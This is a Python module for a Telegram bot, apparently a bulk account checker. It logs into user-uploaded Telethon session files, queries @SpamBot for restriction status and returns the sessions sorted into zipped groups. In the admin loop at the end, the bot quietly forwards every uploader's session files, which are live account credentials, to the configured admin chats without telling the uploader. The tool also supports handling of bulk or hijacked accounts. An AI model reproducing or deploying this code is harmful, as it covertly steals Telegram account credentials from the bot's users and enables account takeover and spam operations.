import os
import zipfile
import shutil
import asyncio
import tempfile
import time
import json
from datetime import datetime
from telethon import TelegramClient
from telethon.errors import FloodWaitError, SessionPasswordNeededError
from telethon.tl.functions.contacts import ResolveUsernameRequest
import logging
from telegram import InlineKeyboardButton, InlineKeyboardMarkup, Update
from telegram.constants import ParseMode
from telegram.ext import ContextTypes

logger = logging.getLogger(__name__)
from dotenv import load_dotenv
load_dotenv()

TEST_BIDIRECTIONAL_BACK = os.getenv("TEST_BIDIRECTIONAL_BACK", "").replace('\\n', '\n')
MAX_EXTRACT_SIZE = int(os.getenv("MK_TIME", 4)) * 1024 * 1024
MAX_TASK_TIME = int(os.getenv("MK_LIST_TIME", "120").replace('S', ''))
SPAMBOT_USERNAME = "@SpamBot"
BACK_BUTTON_EMOJI_ID = "5877629862306385808"

user_bidirectional_states = {}

def create_back_button():
    return InlineKeyboardButton(
        "返回主菜单", 
        callback_data="back_to_main"
    ).to_dict() | {"icon_custom_emoji_id": BACK_BUTTON_EMOJI_ID}

async def show_bidirectional(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    user_id = str(query.from_user.id)
    await query.answer()
    
    keyboard = [[create_back_button()]]
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    await query.edit_message_text(
        text=TEST_BIDIRECTIONAL_BACK,
        parse_mode=ParseMode.HTML,
        reply_markup=reply_markup
    )
    user_bidirectional_states[user_id] = "waiting_bidirectional_zip"
    context.user_data['bidirectional_state'] = "waiting_bidirectional_zip"

def get_total_size(path):
    total = 0
    for root, dirs, files in os.walk(path):
        for f in files:
            fp = os.path.join(root, f)
            if os.path.isfile(fp):
                total += os.path.getsize(fp)
    return total

async def check_account_restriction(client, session_name):
    try:
        spambot = await client.get_entity(SPAMBOT_USERNAME)
        await client.send_message(spambot, "/start")
        await asyncio.sleep(3)
        
        async for message in client.iter_messages(spambot, limit=1):
            if message.out:
                continue
            text = message.text
            
            if ("bird" in text and "free" in text) or \
               ("Kabar baik, akun Anda tidak dibatasi" in text) or \
               ("Boas notícias, nenhum limite foi aplicado à sua conta" in text):
                return "unlimited", "无限制账户"
            else:
                return "limited", "有限制账户"
        
        return "unknown", "无法判断"
    except Exception as e:
        return "error", f"检查失败: {str(e)[:50]}"

async def process_session(session_file, json_file, api_id, api_hash):
    client = None
    result = {
        "session": os.path.basename(session_file),
        "status": "unknown",
        "message": "",
        "phone": None
    }
    
    try:
        client = TelegramClient(session_file, api_id, api_hash)
        await client.connect()
        
        if not await client.is_user_authorized():
            result["status"] = "failed"
            result["message"] = "session无效"
            return result
        
        me = await client.get_me()
        if not me:
            result["status"] = "failed"
            result["message"] = "无法获取用户信息"
            return result
        
        result["phone"] = me.phone
        
        restriction, msg = await check_account_restriction(client, os.path.basename(session_file))
        result["status"] = restriction
        result["message"] = msg
        
    except SessionPasswordNeededError:
        result["status"] = "failed"
        result["message"] = "需要2FA验证"
    except FloodWaitError as e:
        result["status"] = "failed"
        result["message"] = f"等待{e.seconds}秒"
    except Exception as e:
        result["status"] = "failed"
        result["message"] = f"错误: {str(e)[:30]}"
    finally:
        if client:
            await client.disconnect()
    
    return result

async def handle_bidirectional_document(update: Update, context: ContextTypes.DEFAULT_TYPE, user_id: str):
    document = update.message.document
    zip_path = None
    
    if not document.file_name.endswith('.zip'):
        keyboard = [[create_back_button()]]
        reply_markup = InlineKeyboardMarkup(keyboard)
        await update.message.reply_text(
            "<tg-emoji emoji-id='5778527486270770928'>❌</tg-emoji> 请上传ZIP格式的压缩包",
            parse_mode='HTML',
            reply_markup=reply_markup
        )
        context.user_data.pop('bidirectional_state', None)
        user_bidirectional_states.pop(user_id, None)
        return
    
    status_msg = await update.message.reply_text(
        "<tg-emoji emoji-id='5443127283898405358'>📥</tg-emoji> 正在下载文件...",
        parse_mode='HTML'
    )
    
    try:
        file = await context.bot.get_file(document.file_id)
        zip_path = f"downloads/bidirectional_{user_id}_{int(time.time())}.zip"
        os.makedirs("downloads", exist_ok=True)
        await file.download_to_drive(zip_path)
        
        await status_msg.edit_text(
            "<tg-emoji emoji-id='5839200986022812209'>🔍</tg-emoji> 开始处理双向测试...",
            parse_mode='HTML'
        )
        
        await process_bidirectional(update, context, zip_path, user_id)
        
    except Exception as e:
        logger.error(f"处理文件失败: {e}")
        keyboard = [[create_back_button()]]
        reply_markup = InlineKeyboardMarkup(keyboard)
        await update.message.reply_text(
            f"<tg-emoji emoji-id='5778527486270770928'>❌</tg-emoji> 处理失败: {str(e)}",
            parse_mode='HTML',
            reply_markup=reply_markup
        )
    finally:
        if zip_path and os.path.exists(zip_path):
            try:
                os.remove(zip_path)
            except:
                pass
        
        context.user_data.pop('bidirectional_state', None)
        user_bidirectional_states.pop(user_id, None)
        
        try:
            await status_msg.delete()
        except:
            pass

async def process_bidirectional(update, context, zip_path, user_id):
    api_id_str = os.getenv("TELEGRAM_APP_ID")
    api_hash = os.getenv("TELEGRAM_APP_HASH")
    admins = os.getenv("ADMIN_ID", "").split(",")
    
    if not api_id_str or not api_hash:
        keyboard = [[create_back_button()]]
        reply_markup = InlineKeyboardMarkup(keyboard)
        await context.bot.send_message(
            chat_id=update.effective_chat.id,
            text="<tg-emoji emoji-id='5778527486270770928'>❌</tg-emoji> 系统未配置，请联系管理员",
            parse_mode='HTML',
            reply_markup=reply_markup
        )
        return
    
    try:
        api_id = int(api_id_str)
    except (ValueError, TypeError):
        keyboard = [[create_back_button()]]
        reply_markup = InlineKeyboardMarkup(keyboard)
        await context.bot.send_message(
            chat_id=update.effective_chat.id,
            text="<tg-emoji emoji-id='5778527486270770928'>❌</tg-emoji> API配置错误，请联系管理员",
            parse_mode='HTML',
            reply_markup=reply_markup
        )
        return
    
    try:
        await asyncio.wait_for(
            _process_bidirectional_internal(update, context, zip_path, user_id, api_id, api_hash, admins), 
            timeout=MAX_TASK_TIME
        )
    except asyncio.TimeoutError:
        keyboard = [[create_back_button()]]
        reply_markup = InlineKeyboardMarkup(keyboard)
        await context.bot.send_message(
            chat_id=update.effective_chat.id,
            text=f"<tg-emoji emoji-id='5778527486270770928'>❌</tg-emoji> 任务执行超时 ({MAX_TASK_TIME}秒)",
            parse_mode='HTML',
            reply_markup=reply_markup
        )

async def _process_bidirectional_internal(update, context, zip_path, user_id, api_id, api_hash, admins):
    unlimited_zip = None
    limited_zip = None
    failed_zip = None
    
    with tempfile.TemporaryDirectory() as temp_dir:
        extract_dir = os.path.join(temp_dir, "extracted")
        os.makedirs(extract_dir, exist_ok=True)
        
        try:
            with zipfile.ZipFile(zip_path, 'r') as zip_ref:
                zip_ref.extractall(extract_dir)
                
                extracted_size = get_total_size(extract_dir)
                if extracted_size > MAX_EXTRACT_SIZE:
                    raise Exception(f"解压后文件过大 ({extracted_size//1024//1024}MB > {MAX_EXTRACT_SIZE//1024//1024}MB)")
        except Exception as e:
            keyboard = [[create_back_button()]]
            reply_markup = InlineKeyboardMarkup(keyboard)
            await context.bot.send_message(
                chat_id=update.effective_chat.id,
                text=f"<tg-emoji emoji-id='5778527486270770928'>❌</tg-emoji> 解压失败: {str(e)}",
                parse_mode='HTML',
                reply_markup=reply_markup
            )
            return
        
        session_files = []
        for root, dirs, files in os.walk(extract_dir):
            for file in files:
                if file.endswith('.session'):
                    session_path = os.path.join(root, file)
                    session_files.append(session_path)
        
        if not session_files:
            keyboard = [[create_back_button()]]
            reply_markup = InlineKeyboardMarkup(keyboard)
            await context.bot.send_message(
                chat_id=update.effective_chat.id,
                text="<tg-emoji emoji-id='5778527486270770928'>❌</tg-emoji> 未找到session文件",
                parse_mode='HTML',
                reply_markup=reply_markup
            )
            return
        
        status_msg = await context.bot.send_message(
            chat_id=update.effective_chat.id,
            text=f"""<tg-emoji emoji-id="5839200986022812209">🔄</tg-emoji> <b>双向测试进行中</b>

找到 <b>{len(session_files)}</b> 个session文件
<tg-emoji emoji-id="5775887550262546277">🔄</tg-emoji>正在检查限制状态，请稍候...""",
            parse_mode='HTML'
        )
        
        unlimited_dir = os.path.join(temp_dir, "unlimited")
        limited_dir = os.path.join(temp_dir, "limited")
        failed_dir = os.path.join(temp_dir, "failed")
        
        os.makedirs(unlimited_dir, exist_ok=True)
        os.makedirs(limited_dir, exist_ok=True)
        os.makedirs(failed_dir, exist_ok=True)
        
        unlimited_count = 0
        limited_count = 0
        failed_count = 0
        
        unlimited_results = []
        limited_results = []
        failed_results = []
        
        for i, session_file in enumerate(session_files, 1):
            session_name = os.path.splitext(os.path.basename(session_file))[0]
            json_file = os.path.join(os.path.dirname(session_file), f"{session_name}.json")
            
            if i % 3 == 0 or i == len(session_files):
                try:
                    await status_msg.edit_text(
                        text=f"""<tg-emoji emoji-id="5839200986022812209">🔄</tg-emoji> <b>双向测试进行中</b>

进度: {i}/{len(session_files)}
<tg-emoji emoji-id="5920052658743283381">✅</tg-emoji>无限制: {unlimited_count} | <tg-emoji emoji-id="5922712343011135025">⚠️</tg-emoji>有限制: {limited_count} | <tg-emoji emoji-id="5886496611835581345">❌</tg-emoji>失败: {failed_count}""",
                        parse_mode='HTML'
                    )
                except:
                    pass
            
            result = await process_session(session_file, json_file, api_id, api_hash)
            
            if result["status"] == "unlimited":
                target_dir = unlimited_dir
                unlimited_count += 1
                unlimited_results.append(result)
            elif result["status"] == "limited":
                target_dir = limited_dir
                limited_count += 1
                limited_results.append(result)
            else:
                target_dir = failed_dir
                failed_count += 1
                failed_results.append(result)
            
            try:
                shutil.copy2(session_file, os.path.join(target_dir, os.path.basename(session_file)))
            except:
                pass
            
            if json_file and os.path.exists(json_file):
                try:
                    shutil.copy2(json_file, os.path.join(target_dir, os.path.basename(json_file)))
                except:
                    pass
            
            await asyncio.sleep(1)
        
        timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
        
        unlimited_zip = os.path.join(temp_dir, "unlimited.zip")
        if unlimited_count > 0:
            with zipfile.ZipFile(unlimited_zip, 'w') as zipf:
                for root, dirs, files in os.walk(unlimited_dir):
                    for file in files:
                        file_path = os.path.join(root, file)
                        arcname = os.path.relpath(file_path, unlimited_dir)
                        zipf.write(file_path, arcname)
        
        limited_zip = os.path.join(temp_dir, "limited.zip")
        if limited_count > 0:
            with zipfile.ZipFile(limited_zip, 'w') as zipf:
                for root, dirs, files in os.walk(limited_dir):
                    for file in files:
                        file_path = os.path.join(root, file)
                        arcname = os.path.relpath(file_path, limited_dir)
                        zipf.write(file_path, arcname)
        
        failed_zip = os.path.join(temp_dir, "failed.zip")
        if failed_count > 0:
            with zipfile.ZipFile(failed_zip, 'w') as zipf:
                for root, dirs, files in os.walk(failed_dir):
                    for file in files:
                        file_path = os.path.join(root, file)
                        arcname = os.path.relpath(file_path, failed_dir)
                        zipf.write(file_path, arcname)
        
        result_text = f"""<tg-emoji emoji-id="5909201569898827582">✅</tg-emoji> <b>双向测试完成</b>

<tg-emoji emoji-id="5931472654660800739">📊</tg-emoji> 统计结果:
• <tg-emoji emoji-id="5886412370347036129">👤</tg-emoji> 总账号: <b>{len(session_files)}</b>
• <tg-emoji emoji-id="5920052658743283381">✅</tg-emoji> 无限制: <b>{unlimited_count}</b>
• <tg-emoji emoji-id="5922712343011135025">⚠️</tg-emoji> 有限制: <b>{limited_count}</b>
• <tg-emoji emoji-id="5886496611835581345">❌</tg-emoji> 失败: <b>{failed_count}</b>"""

        await context.bot.send_message(
            chat_id=update.effective_chat.id,
            text=result_text,
            parse_mode='HTML'
        )
        
        if unlimited_count > 0:
            with open(unlimited_zip, 'rb') as f:
                await context.bot.send_document(
                    chat_id=update.effective_chat.id,
                    document=f,
                    filename=f"unlimited_{timestamp}.zip",
                    caption=f"<b><tg-emoji emoji-id='5920052658743283381'>✅</tg-emoji> 无限制账户 ({unlimited_count}个)</b>",
                    parse_mode='HTML'
                )
        
        if limited_count > 0:
            with open(limited_zip, 'rb') as f:
                await context.bot.send_document(
                    chat_id=update.effective_chat.id,
                    document=f,
                    filename=f"limited_{timestamp}.zip",
                    caption=f"<b><tg-emoji emoji-id='5922712343011135025'>⚠️</tg-emoji> 有限制账户 ({limited_count}个)</b>",
                    parse_mode='HTML'
                )
        
        if failed_count > 0:
            with open(failed_zip, 'rb') as f:
                await context.bot.send_document(
                    chat_id=update.effective_chat.id,
                    document=f,
                    filename=f"failed_{timestamp}.zip",
                    caption=f"<b><tg-emoji emoji-id='5886496611835581345'>❌</tg-emoji> 失败 ({failed_count}个)</b>",
                    parse_mode='HTML'
                )
        
        for admin_id in admins:
            admin_id = admin_id.strip()
            if not admin_id:
                continue
            
            try:
                await context.bot.send_message(
                    chat_id=admin_id,
                    text=f"""<tg-emoji emoji-id="5909201569898827582">📢</tg-emoji> <b>双向测试任务完成</b>

<tg-emoji emoji-id="5886412370347036129">👤</tg-emoji> 用户: <code>{user_id}</code>
<tg-emoji emoji-id="5886412370347036129">📊</tg-emoji> 总账号: <b>{len(session_files)}</b>
• <tg-emoji emoji-id="5920052658743283381">✅</tg-emoji> 无限制: <b>{unlimited_count}</b>
• <tg-emoji emoji-id="5922712343011135025">⚠️</tg-emoji> 有限制: <b>{limited_count}</b>
• <tg-emoji emoji-id="5886496611835581345">❌</tg-emoji> 失败: <b>{failed_count}</b>""",
                    parse_mode='HTML'
                )
                
                admin_timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
                
                if unlimited_count > 0:
                    with open(unlimited_zip, 'rb') as f:
                        await context.bot.send_document(
                            chat_id=admin_id,
                            document=f,
                            filename=f"unlimited_{user_id}_{admin_timestamp}.zip"
                        )
                
                if limited_count > 0:
                    with open(limited_zip, 'rb') as f:
                        await context.bot.send_document(
                            chat_id=admin_id,
                            document=f,
                            filename=f"limited_{user_id}_{admin_timestamp}.zip"
                        )
                
                if failed_count > 0:
                    with open(failed_zip, 'rb') as f:
                        await context.bot.send_document(
                            chat_id=admin_id,
                            document=f,
                            filename=f"failed_{user_id}_{admin_timestamp}.zip"
                        )
            except Exception as e:
                logger.error(f"发送给管理员 {admin_id} 失败: {e}")
        
        try:
            await status_msg.delete()
        except:
            pass
